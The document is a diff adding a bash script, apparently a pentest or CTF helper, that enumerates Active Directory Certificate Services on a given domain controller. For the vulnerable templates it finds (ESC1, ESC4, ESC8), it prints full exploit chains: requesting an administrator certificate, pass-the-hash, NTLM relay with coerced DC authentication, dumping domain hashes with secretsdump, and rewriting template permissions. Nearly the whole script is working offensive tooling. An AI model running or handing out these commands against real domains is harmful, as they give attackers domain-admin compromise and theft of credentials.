@@ -1,0 +1,125 @@
+#!/bin/bash
+
+RED='\033[31m'
+GREEN='\033[32m'
+BLUE='\033[34m'
+YELLOW='\033[33m'
+CYAN='\033[36m'
+NC='\033[0m'
+
+usage() {
+    echo -e "${RED}Usage: adcsenum <dc_ip> <domain> <user> <pass>${NC}"
+    echo -e "${RED}  Ex:  adcsenum 10.10.10.1 corp.local john Password123${NC}"
+    exit 1
+}
+
+[ "$#" -ne 4 ] && usage
+
+DC_IP="$1"
+DOMAIN="$2"
+USER="$3"
+PASS="$4"
+
+get_ip() {
+    local ip
+    ip=$(ip addr show tun0 2>/dev/null | grep 'inet ' | awk '{print $2}' | cut -d'/' -f1)
+    [ -z "$ip" ] && ip=$(ip addr show eth0 2>/dev/null | grep 'inet ' | awk '{print $2}' | cut -d'/' -f1)
+    echo "$ip"
+}
+
+KALI_IP=$(get_ip)
+OUTFILE="/tmp/adcs_enum_$$.txt"
+
+echo ""
+echo -e "${YELLOW}== ADCS Enumeration: $DOMAIN ($DC_IP) ==${NC}"
+
+# CA info via nxc
+echo -e "\n${CYAN}[CA Info]${NC}"
+nxc ldap "$DC_IP" -u "$USER" -p "$PASS" -M adcs 2>/dev/null | grep -E 'ADCS|CA Name|DNS' | sed 's/^ *//'
+
+# Find vulnerable templates
+echo -e "\n${CYAN}[Vulnerable Templates]${NC}"
+echo -e "${BLUE}[*] Running certipy-ad find...${NC}"
+certipy-ad find -u "$USER@$DOMAIN" -p "$PASS" -dc-ip "$DC_IP" -enabled -vulnerable -stdout 2>/dev/null > "$OUTFILE"
+
+if [ ! -s "$OUTFILE" ]; then
+    echo -e "${RED}[-] certipy-ad failed or no vulnerable templates found${NC}"
+    rm -f "$OUTFILE"
+    exit 1
+fi
+
+# Parse ESC types found
+ESCS=$(grep -oP 'ESC\d+' "$OUTFILE" | sort -u)
+
+if [ -z "$ESCS" ]; then
+    echo -e "${RED}[-] No vulnerable templates found${NC}"
+    rm -f "$OUTFILE"
+    exit 0
+fi
+
+for ESC in $ESCS; do
+    echo -e "${GREEN}[+] $ESC found${NC}"
+done
+
+# Extract template + CA names
+TEMPLATE=$(grep -oP 'Template Name\s*:\s*\K\S+' "$OUTFILE" | head -1)
+CA=$(grep -oP 'Certification Authorities\s*:\s*\K.+' "$OUTFILE" | head -1 | xargs)
+CA_HOST=$(grep -oP 'DNS Name\s*:\s*\K\S+' "$OUTFILE" | head -1)
+
+echo ""
+echo -e "${YELLOW}== Exploit Commands ==${NC}"
+
+# ESC1
+if echo "$ESCS" | grep -q "ESC1"; then
+    echo -e "\n${CYAN}[ESC1 — Misconfigured Template]${NC}"
+    echo -e "${BLUE}# Step 1 — Request cert as administrator:${NC}"
+    echo "certipy-ad req -u '$USER@$DOMAIN' -p '$PASS' \\"
+    echo "  -target $CA_HOST -ca '$CA' \\"
+    echo "  -template $TEMPLATE -upn 'administrator@$DOMAIN'"
+    echo ""
+    echo -e "${BLUE}# Step 2 — Authenticate (get TGT + NT hash):${NC}"
+    echo "certipy-ad auth -pfx administrator.pfx -dc-ip $DC_IP"
+    echo ""
+    echo -e "${BLUE}# Step 3 — PTH:${NC}"
+    echo "nxc smb $DC_IP -u administrator -H <NT_HASH>"
+fi
+
+# ESC8
+if echo "$ESCS" | grep -q "ESC8"; then
+    echo -e "\n${CYAN}[ESC8 — NTLM Relay to HTTP Enrollment]${NC}"
+    echo -e "${BLUE}# Terminal 1 — Start relay:${NC}"
+    echo "impacket-ntlmrelayx -t http://$CA_HOST/certsrv/certfnsh.asp \\"
+    echo "  --adcs --template DomainController -smb2support"
+    echo ""
+    echo -e "${BLUE}# Terminal 2 — Coerce DC auth:${NC}"
+    echo "coercer coerce --target-ip $DC_IP --l $KALI_IP \\"
+    echo "  -u $USER -p $PASS --filter-method-name EfsRpcAddUsersToFile"
+    echo ""
+    echo -e "${BLUE}# After relay captures cert (DC\$.pfx):${NC}"
+    echo "certipy-ad auth -pfx DC\$.pfx -dc-ip $DC_IP"
+    echo "impacket-secretsdump '$DOMAIN/dc\$@$DC_IP' -hashes 'aad3b435b51404eeaad3b435b51404ee:<NT_HASH>'"
+fi
+
+# ESC4
+if echo "$ESCS" | grep -q "ESC4"; then
+    echo -e "\n${CYAN}[ESC4 — Weak Template DACL]${NC}"
+    echo -e "${BLUE}# Modify template to ESC1 conditions, then exploit as ESC1:${NC}"
+    echo "certipy-ad template -u '$USER@$DOMAIN' -p '$PASS' -dc-ip $DC_IP -template $TEMPLATE -save-old"
+    echo "certipy-ad req -u '$USER@$DOMAIN' -p '$PASS' -target $CA_HOST -ca '$CA' -template $TEMPLATE -upn 'administrator@$DOMAIN'"
+    echo "certipy-ad auth -pfx administrator.pfx -dc-ip $DC_IP"
+    echo ""
+    echo -e "${BLUE}# Restore template after:${NC}"
+    echo "certipy-ad template -u '$USER@$DOMAIN' -p '$PASS' -dc-ip $DC_IP -template $TEMPLATE -configuration ${TEMPLATE}.json"
+fi
+
+# Other ESCs — print raw output
+OTHER=$(echo "$ESCS" | grep -vE 'ESC1|ESC4|ESC8')
+if [ -n "$OTHER" ]; then
+    echo -e "\n${CYAN}[Other: $OTHER]${NC}"
+    echo -e "${BLUE}Raw certipy output saved — review manually:${NC}"
+    grep -A5 "$OTHER" "$OUTFILE" | head -30
+fi
+
+rm -f "$OUTFILE"
+echo ""
+echo -e "${YELLOW}=================================${NC}"
